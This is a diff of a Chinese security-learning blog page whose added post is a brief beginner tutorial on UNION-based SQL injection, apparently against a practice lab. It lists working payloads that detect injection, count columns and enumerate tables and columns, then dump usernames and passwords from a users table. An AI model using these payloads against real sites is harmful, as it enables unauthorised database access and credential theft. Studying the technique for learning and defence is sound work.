@@ -5,8 +5,8 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="对Typhoon的一次入侵, pgg,信息安全，小白教程，情感博主">
-    <meta name="description" content="对Typhoon的一次入侵 | pgg学长">
+    <meta name="keywords" content="sql注入入门基本语法, pgg,信息安全，小白教程，情感博主">
+    <meta name="description" content="sql注入入门基本语法：今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。有没有听过一句话“一生二，二生三，三生万物”sql注入里 今天我讲的就是这个一。########################">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>对Typhoon的一次入侵 | pgg学长</title>
+    <title>sql注入入门基本语法 | pgg学长</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -56,13 +56,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        对Typhoon的一次入侵
+                        sql注入入门基本语法
                     </div>
                 </div>
             </div>
@@ -84,14 +84,24 @@
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2019-05-20
+                    <i class="fa fa-clock-o fa-fw"></i>2019-05-31
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="sql注入入门基本语法："><a href="#sql注入入门基本语法：" class="headerlink" title="sql注入入门基本语法："></a>sql注入入门基本语法：</h1><h4 id="今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。"><a href="#今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。" class="headerlink" title="今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。"></a>今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。</h4><h4 id="有没有听过一句话“一生二，二生三，三生万物”"><a href="#有没有听过一句话“一生二，二生三，三生万物”" class="headerlink" title="有没有听过一句话“一生二，二生三，三生万物”"></a>有没有听过一句话“一生二，二生三，三生万物”</h4><h4 id="sql注入里-今天我讲的就是这个一。"><a href="#sql注入里-今天我讲的就是这个一。" class="headerlink" title="sql注入里 今天我讲的就是这个一。"></a>sql注入里 今天我讲的就是这个一。</h4><p>############################################################</p>
+<p>先判断注入类型   id=1’        id=1 and 1=1</p>
+<p> 猜字段数    order by 1         猜有几个字段数</p>
+<p>  爆当前的用户名  数据库名   mysql版本        union select database(),user(),version()</p>
+<h4 id="这里我还是解释下吧-如果-order-by-10-那么就-查看他的显示位，-知道了显示位，想查数据库名就在显示位输入-database-select-union-1-2-3-database-5-6-7-8-9-10"><a href="#这里我还是解释下吧-如果-order-by-10-那么就-查看他的显示位，-知道了显示位，想查数据库名就在显示位输入-database-select-union-1-2-3-database-5-6-7-8-9-10" class="headerlink" title="这里我还是解释下吧   如果 order by  10     那么就 查看他的显示位， 知道了显示位，想查数据库名就在显示位输入 database()   select union 1,2,3,database(),5,6,7,8,9,10"></a>这里我还是解释下吧   如果 order by  10     那么就 查看他的显示位， 知道了显示位，想查数据库名就在显示位输入 database()   select union 1,2,3,database(),5,6,7,8,9,10</h4><p>?id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=’security’ limit 0,1%23      爆表        假设库为security</p>
+<p>?id=-1’ union select 1,column_name,3 from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 0,1%23   爆字段</p>
+<p>?id=-1’ union select id,username,password from users limit 0,1%23       爆字段内容</p>
+<p>user====&gt;id,username,password</p>
+<p>select name from user;</p>
+<p>select table_name from information_schema.tables where table_schema=’security’;    </p>
+
             </div>
             <hr>
 
@@ -221,7 +231,7 @@
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://pgg666.org" class="b-link-green">pgg学长</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/05/20/对Typhoon的一次入侵/" class="b-link-green">对Typhoon的一次入侵</a>
+                    <a href="/2019/05/31/sql注入入门基本语法/" class="b-link-green">sql注入入门基本语法</a>
                 </p>
             </div>
         </div>
@@ -245,17 +255,17 @@
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">上一篇</div>
             <div class="card">
-                <a href="/2019/05/31/sql注入入门基本语法/">
+                <a href="/2019/05/31/mysql数据库/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="sql注入入门基本语法">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="mysql数据库">
                         
-                        <span class="card-title">sql注入入门基本语法</span>
+                        <span class="card-title">mysql数据库</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">sql注入入门基本语法：今日，天下英雄齐聚在此，还有不少是我pgg昔日的好友，你们每次看到我都夸我帅是什么意思。有没有听过一句话“一生二，二生三，三生万物”sql注入里 今天我讲的就是这个一。########################</div>
+                    <div class="summary">mysql数据库数据库简介：1. 什么是数据库：数据库就是将大量数据保存起来，通过计算机加工而成的可以高效访问的数据集合数据库是长期储存在计算机内，有组织的，可共享的数据集合。2.常见的数据库：①Oracle Database:甲骨文公司 </div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-31
@@ -276,21 +286,20 @@
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/2019/04/28/入侵提权内网渗透/">
+                <a href="/2019/05/20/对Typhoon的一次入侵/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="入侵提权内网渗透(完整版)">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="对Typhoon的一次入侵">
                         
-                        <span class="card-title">入侵提权内网渗透(完整版)</span>
+                        <span class="card-title">对Typhoon的一次入侵</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">入侵提权内网渗透(完整版)​              #注：这次靶机测试，我搞了两天，被靶机秀成了麻瓜，接下来我带领大家领略入侵的快感，当然，你们会看的头皮发麻  哈哈
-​         亲爱的老师给了我们一个ip  192.168.0</div>
+                    <div class="summary"></div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-28
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-05-20
                             </span>
                         <span class="publish-author">
                             
